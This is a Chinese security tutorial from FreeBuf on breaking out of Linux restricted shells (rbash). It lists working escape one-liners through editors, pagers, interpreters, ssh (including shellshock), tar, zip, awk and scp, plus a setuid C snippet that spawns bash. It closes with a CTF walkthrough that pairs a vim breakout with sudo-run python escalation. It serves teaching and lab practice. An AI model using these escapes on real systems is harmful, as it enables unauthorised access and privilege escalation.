***本文作者：zusheng，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

 **严正声明：本文涉及到的技术仅限于教育和讨论目的，严禁用于非法用途。**

## 0x01 前言

 **如今网络安全行业越来越规范，我们还想直接获取到未限制的shell是件很困难的事情，系统运维人员一般都会给Linux
shell加上一些限制来防止入侵，通常会阻止运行某些特定的命令。**

## 0x01 什么是Restricted Shell

Restricted Shell既受限的shell，它与一般标准shell的区别在于会限制执行一些行为，比如：

    
    
    使用 cd 来改变路径
    设置或取消SHELL,PATH,ENV,或BASH_ENV变量的值
    指定的命令名中包含/
    

### 如何设置一个Restricted Shell

我们可以先复制一个bash，然后设置某个用户登录后运行的shell：

    
    
    cp /bin/bash  /bin/rbash
    useradd -s /bin/rbash zusheng
    

然后允许不允许什么命令，就可以自行修改了。

## 0x02 枚举Linux环境

首先我们需要去检查Linux环境能做什么，这相当于一个收集情报的工作，这个步骤必不可少，有了情报才可以分析下一步骤该如何去做。

### 命令

 **检查可用的命令：**

> 如cd、ls、echo等

![检查可用的命令](https://image.3001.net/images/20181110/1541820877_5be651cd47f6f.png!small)

 **操作符：**

    
    
    >
    >>
    <
    |
    

**root身份运行哪些命令：**

    
    
    sudo -l
    

**检查shell**

    
    
    echo $SHELL
    基本上都是/bin/rbash
    

### 编程语言

检查可用的编程语言，如python、perl、ruby等

![编程语言](https://image.3001.net/images/20181110/1541820884_5be651d4f16c8.png!small)

### 检查环境变量

运行env或者printenv

## 0x03 常见利用技术

### "/"字符被允许

如果/被允许，我们可以直接运行：

![常见利用技术](https://image.3001.net/images/20181110/1541820889_5be651d9b9089.png!small)

允许：

![常见利用技术](https://image.3001.net/images/20181110/1541820893_5be651dd2ef0e.png!small)

### cp命令被允许

如果cp命令被允许，我们可以直接复制/bin/bash到本用户目录：

![cp命令被允许](https://image.3001.net/images/20181110/1541820898_5be651e23b6c0.png!small)

允许：

![cp命令被允许](https://image.3001.net/images/20181110/1541820902_5be651e609637.png!small)

### 常见应用

探测系统中是否存在常见应用，如FTP、GDB等

FTP：

    
    
    ftp > !/bin/sh
    

GDB：

    
    
    gdb > !/bin/sh
    

![常见应用](https://image.3001.net/images/20181110/1541820907_5be651eb2e109.png!small)

man/git：

    
    
    man > !/bin/sh
    git > git help status
    

![常见应用](https://image.3001.net/images/20181110/1541820915_5be651f3694bf.png!small)![VIM](https://image.3001.net/images/20181110/1541820919_5be651f7cccaa.png!small)

vim：

    
    
    !/bin/sh 或者 !/bin/bash
    

![VIM](https://image.3001.net/images/20181110/1541820924_5be651fcae8f6.png!small)

允许情况下：

![允许情况下](https://image.3001.net/images/20181110/1541820929_5be652013957a.png!small)

more/less

    
    
    !'sh'
    

![more/less](https://image.3001.net/images/20181110/1541820936_5be65208ce705.png!small)![more/less](https://image.3001.net/images/20181110/1541820943_5be6520f69d1c.png!small)

### set shell

在一些编辑器或命令中我们还以为设置shell变量然后执行，比如vim中：

![set
shell](https://image.3001.net/images/20181110/1541820955_5be6521b1eaec.png!small)![set
shell](https://image.3001.net/images/20181110/1541820962_5be6522246cf0.png!small)

### 更改PATH或SHELL环境变量

输入命令

    
    
    export -p
    

查看

![查看](https://image.3001.net/images/20181110/1541820968_5be65228e6fe6.png!small)

PATH和SHELL变量很可能是'-rx'，这意味着你只能执行不能写入，如果可写，你就可以直接写入/bin/bash。

### 编程语言

python：

    
    
    python -c 'import os; os.system("/bin/bash")'
    

php：

    
    
    php -a then exec("sh -i");
    

perl：

    
    
    perl -e 'exec "/bin/sh";'
    

lua：

    
    
    os.execute('/bin/sh').
    

ruby：

    
    
    exec "/bin/sh"
    

### 最新技术

ssh:

    
    
    ssh username@IP - t "/bin/sh" or "/bin/bash"
    

ssh2:

    
    
    ssh username@IP -t "bash --noprofile"
    

ssh3:

    
    
    ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
    

ssh4:

    
    
    ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)
    

ZIP:

    
    
    zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
    

tar:

    
    
    tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
    

awk:

    
    
    awk 'BEGIN {system("/bin/bash")}'
    

scp：

    
    
     scp -S ./spellbash.sh 127.0.0.1:/tmp/z.zip ./
    

scp -S program： 指定加密传输时所使用的程序

我们这个spellbash.sh脚本功能就在于给shell加权限执行

shell代码如下：

    
    
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdio.h>
    int main(int argc, char **argv, char **envp)
    {
        setresgid(getegid(), getegid(), getegid());
        setresuid(geteuid(), geteuid(), geteuid());
    
        execve("/bin/bash", argv,  envp);
        return 0;
    }
    

pico：

    
    
    pico -s "/bin/bash"
    然后输入/bin/bash按CTRL + T
    

## 0x04 实战操作

针对于Linux Restricted Shell绕过技巧基本上是介绍到了，接下来就是灵活运用的问题，我这里选择了一个挑战来运用一下文中的一些技术。

连接上机器，经过一番信息收集，我们发现只有vim可以利用一下：

![实战操作](https://image.3001.net/images/20181110/1541820978_5be652327a4ec.png!small)

尝试

    
    
    !/bin/bash
    /bin/rbash: /bin/bash: restricted: cannot specify `/' in command names
    

继续尝试

    
    
    set shell=/bin/bash
    shell
    

可以发现我们成功绕过了rbash：

![成功绕过了rbash](https://image.3001.net/images/20181110/1541820983_5be65237b6e8c.png!small)

随后我们发现当前用户没有打开目标文件的权限，sudo -l查看一下能运行哪些命令

    
    
    (app-script-ch14-2) NOPASSWD: /usr/bin/python
    

我们以app-script-ch14-2运行python，思路上面也提到了，可以利用python运行bash

    
    
    /usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("/bin/bash")'
    

继续sudo -l：

![继续sudo
-l](https://image.3001.net/images/20181110/1541820989_5be6523df3c31.png!small)

tar上面也总结过了：

![tar上面也总结过了](https://image.3001.net/images/20181110/1541820995_5be6524339c9e.png!small)

接下来套路基本上一样不再演示了。

## 0x05 总结

正如我们所看到的，总有一种办法来绕过受限制的shell，这里我介绍了常见的例子，但是安全技术的可能性是无穷无尽，希望更多人能分享一下技巧，最后感谢分享技术的黑客、安全研究人员，没有他们的分享就没有这篇文章。

 ***本文作者：zusheng，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

